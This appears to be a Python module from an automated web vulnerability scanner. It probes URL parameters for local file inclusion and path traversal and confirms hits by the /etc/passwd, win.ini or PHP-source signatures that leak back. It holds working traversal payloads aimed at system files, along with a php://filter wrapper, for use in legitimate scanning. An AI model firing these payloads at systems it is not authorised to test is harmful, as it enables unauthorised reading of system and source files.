"""Local File Inclusion / Path Traversal probe (vuln phase, non-destructive).

For file-ish query parameters (`file`, `path`, `page`, `template`, `doc`,
`document`, `include`, `view`, `name`, `lang`, `download`, `filename`, `dir`,
`folder`, `load`) this worker injects classic read-only traversal payloads for
both *nix and Windows targets, plus a PHP base64 wrapper, and confirms a hit
only when the response body leaks a recognizable system-file signature:

  * ``/etc/passwd``        — the canonical root line ``root:...:0:0:``
  * ``C:\\windows\\win.ini`` — section headers ``[fonts]`` / ``[extensions]``
  * ``php://filter`` wrapper — a base64 blob that decodes to PHP source

Two controls suppress false positives:
  1. A benign control value (a normal-looking filename) is fetched first; if the
     control response already contains the signature it is treated as a baseline
     artifact and that parameter is skipped.
  2. A keyword-only control — a bare TOPICAL keyword (e.g. ``etc`` / ``windows``)
     with NO ``../`` traversal and NOT the exact filename. A real filesystem read
     requires the traversal sequence to escape the docroot; a full-text doc
     /search endpoint surfaces the same article for the topical keyword alone. If
     the keyword-only probe leaks the same signature, the parameter is search
     /docs-driven (not LFI) and is skipped — this kills the documentation/search
     -echo false positive where the payload string ``etc/passwd`` merely matches
     a tutorial that quotes a passwd line.

READ-ONLY: every payload only *reads* (or attempts to read) a file. Nothing is
written, deleted, or otherwise mutated.
"""

from __future__ import annotations

import base64
import binascii
import logging
import re
from typing import List, Optional
from urllib.parse import parse_qsl, urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, add_query, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.lfi")

TECHNIQUE = "lfi"

# Parameters that commonly take a filename/path and are LFI-prone.
_FILE_PARAMS = [
    "file", "path", "page", "template", "doc", "document", "include",
    "view", "name", "lang", "download", "filename", "dir", "folder", "load",
]

# Read-only traversal payloads (nix + Windows) plus a PHP wrapper. Use a DEEP
# traversal (8x ../): extra ../ at filesystem root are no-ops, so one deep
# payload reaches /etc/passwd from both shallow and deep docroots (DVWA's
# /var/www/html/vulnerabilities/fi/ needs 5+, a shallow app needs 1-2).
_TRAV = "../" * 8
_PAYLOADS = [
    _TRAV + "etc/passwd",
    ("..%2f" * 8) + "etc%2fpasswd",
    ("....//" * 8) + "etc/passwd",
    _TRAV + "windows/win.ini",
    "php://filter/convert.base64-encode/resource=index",
]

# Extend with the curated payload library (knowledge/payloads.json) — adds
# /proc/self/environ, extra wrappers and encodings learned from real reports.
# Our deep-traversal defaults stay first; library payloads are appended deduped.
try:
    from core.payload_library import merge_payloads
    _PAYLOADS = merge_payloads(_PAYLOADS, "lfi")
except Exception:  # noqa: BLE001 — library is optional; never break the worker
    pass

# A harmless, normal-looking control value used for the baseline request.
_CONTROL = "index"

# Keyword-only "search controls": a bare topical keyword WITHOUT any traversal
# and WITHOUT the exact filename token. A real filesystem read needs the `../`
# sequence to escape the docroot; a full-text doc/search endpoint surfaces the
# SAME tutorial/article for the topical keyword alone (e.g. a search for "etc"
# finds the "Understanding /etc/passwd" article). So if one of these keyword-only
# probes ALSO leaks the signature, the param is keyword-driven (search/docs), NOT
# a path traversal, and the param is skipped. This is the decisive guard against
# documentation/search endpoints that merely echo a passwd/win.ini snippet
# matching the search term.
#
# We deliberately AVOID using the exact filename ("passwd", "win.ini") as a probe
# so a target that happens to expose a file literally named that in CWD isn't
# misclassified — a topical keyword ("etc", "windows") still triggers the corpus
# match on a real search endpoint while never naming a real file.
#   kind -> tuple of keyword-only probe values (no `../`, no exact filename).
#
# The php-wrapper kind needs the SAME treatment for the symmetric FP: a code
# -snippet / template gallery whose search param echoes base64-encoded source
# (the standard clipboard.js `data-clipboard-text` copy pattern). The wrapper
# payload string `php://filter/convert.base64-encode/resource=index` carries the
# full-text tokens "php" and "index", which surface a "PHP index.php" card whose
# clipboard blob decodes to <?php — flagged as LFI even though no file is read.
# The token-only probes below share those tokens but carry NO wrapper scheme: a
# genuine php://filter read only emits base64-PHP when the wrapper is actually
# present, so the token-only probe returns the app's normal page (no leak) and
# the true positive still fires; a search/echo gallery leaks base64-PHP for the
# bare tokens too (=> skip).
_KEYWORD_CONTROLS = {
    "passwd": ("etc", "etcetera"),
    "win.ini": ("windows", "win"),
    "php-wrapper": ("index.php", "index"),
}

# The canonical /etc/passwd root line: root:<pwd>:0:0:... (uid 0, gid 0).
_PASSWD_ROOT_RE = re.compile(r"root:[^:\n]*:0:0:", re.I)
# win.ini canonical section headers.
_WININI_RE = re.compile(r"\[(?:fonts|extensions)\]", re.I)
# base64 blob candidates (long, base64 alphabet) to test for decoded PHP.
_B64_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
# Markers that decoded bytes are PHP source.
_PHP_MARKERS = (b"<?php", b"<?=")


def _decodes_to_php(body: str) -> Optional[str]:
    """Return a snippet if any base64 blob in `body` decodes to PHP source."""
    for m in _B64_RE.finditer(body):
        blob = m.group(0)
        # base64 length must be a multiple of 4 to decode cleanly.
        trimmed = blob[: len(blob) - (len(blob) % 4)]
        if len(trimmed) < 40:
            continue
        try:
            decoded = base64.b64decode(trimmed, validate=True)
        except (binascii.Error, ValueError):
            continue
        low = decoded.lstrip()[:64].lower()
        if any(low.startswith(mk) or mk in decoded[:64].lower() for mk in _PHP_MARKERS):
            return blob[:48]
    return None


def _match_passwd(body: str) -> Optional[str]:
    """Signature of a leaked /etc/passwd: the canonical root line (uid 0, gid 0).

    The structural strength (one example line vs a whole enumerated file) is no
    longer the FP discriminator — the keyword-only control in ``run`` is. Here we
    just confirm a passwd-shaped root line is present and report it as evidence.
    """
    m = _PASSWD_ROOT_RE.search(body)
    return m.group(0) if m else None


def _match_winini(body: str) -> Optional[str]:
    """Signature of a leaked win.ini: a canonical section header.

    As with passwd, the FP discriminator is the keyword-only control, not the
    header count.
    """
    m = _WININI_RE.search(body)
    return m.group(0) if m else None


def _match_signature(body: str) -> Optional[tuple[str, str]]:
    """Return (kind, evidence) if `body` leaks a known system-file signature."""
    if not body:
        return None
    passwd = _match_passwd(body)
    if passwd:
        return ("passwd", passwd)
    winini = _match_winini(body)
    if winini:
        return ("win.ini", winini)
    php = _decodes_to_php(body)
    if php:
        return ("php-wrapper", f"base64->PHP: {php}...")
    return None


def _candidate_params(url: str) -> List[str]:
    """File-ish params already present on the URL, else the full default set, plus
    any crawler-discovered params (empty by default -> unchanged behavior)."""
    existing = {k.lower() for k, _ in parse_qsl(urlsplit(url).query)}
    present = [p for p in _FILE_PARAMS if p in existing]
    base = present or list(_FILE_PARAMS)
    from core.payload_library import get_discovered_params
    disc = [p for p in get_discovered_params() if p.lower() not in
            {b.lower() for b in base}]
    return base + disc if disc else base


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    timeout = min(agent.timeout_s, 10.0)
    findings: list[dict] = []

    # Cache keyword-control verdicts per (param, kind) so we fetch each at most
    # once even across multiple payloads of the same kind.
    keyword_driven: dict[tuple[str, str], bool] = {}

    async def _is_keyword_driven(param: str, kind: str) -> bool:
        """True if the param leaks `kind`'s signature for a bare control token.

        Probes with a benign value that shares the payload's full-text tokens
        but carries NONE of the attack machinery — for passwd/win.ini that means
        the topical keyword WITHOUT any `../` traversal; for php-wrapper it means
        the resource token (`index.php` / `index`) WITHOUT the `php://filter`
        wrapper scheme. A real read needs that machinery (the `../` to escape the
        docroot, or the wrapper to base64-encode source); a full-text search
        /echo endpoint surfaces the same article/snippet for the bare token. If a
        token-only probe leaks the SAME signature kind, the endpoint is
        search/echo-driven, not LFI.
        """
        cache_key = (param, kind)
        if cache_key in keyword_driven:
            return keyword_driven[cache_key]
        verdict = False
        for probe in _KEYWORD_CONTROLS.get(kind, ()):
            probe_url = add_query(url, param, probe)
            kresp = await fetch("GET", probe_url, timeout=timeout)
            if kresp is None:
                continue
            khit = _match_signature(kresp.body)
            if khit and khit[0] == kind:
                verdict = True
                break
        keyword_driven[cache_key] = verdict
        return verdict

    for param in _candidate_params(url):
        # Baseline with a benign control value: if the signature already shows
        # up here, the page echoes it normally — skip to avoid a false positive.
        control_url = add_query(url, param, _CONTROL)
        baseline = await fetch("GET", control_url, timeout=timeout)
        if baseline is not None and _match_signature(baseline.body):
            continue

        for payload in _PAYLOADS:
            test_url = add_query(url, param, payload)
            resp = await fetch("GET", test_url, timeout=timeout)
            if resp is None or not resp.body:
                continue
            hit = _match_signature(resp.body)
            if not hit:
                continue
            kind, evidence = hit
            # Decisive FP guard: if the bare file keyword (no `../`) also leaks
            # this signature kind, the param is keyword/search-driven (a docs or
            # full-text-search endpoint echoing a tutorial), NOT a real file
            # read. Skip the entire param — it cannot be confirmed as LFI.
            if await _is_keyword_driven(param, kind):
                break
            findings.append({
                "type": "lfi",
                "vuln_type": f"lfi:{param}",
                "title": f"Local File Inclusion / Path Traversal via '{param}'",
                "severity": "high",
                "url": test_url,
                "parameter": param,
                "payload": payload,
                "cwe": "CWE-22",
                "confidence": 0.9,
                "evidence": (
                    f"{kind} signature leaked in response: {evidence!r} "
                    f"(absent in control={_CONTROL!r}; token/keyword-only "
                    f"control(s) {_KEYWORD_CONTROLS.get(kind, ())!r} did not "
                    f"leak it, so not a search/echo artifact)"
                ),
            })
            # One confirmed leak per parameter is enough.
            break

    return findings


register_worker("vuln", TECHNIQUE, run)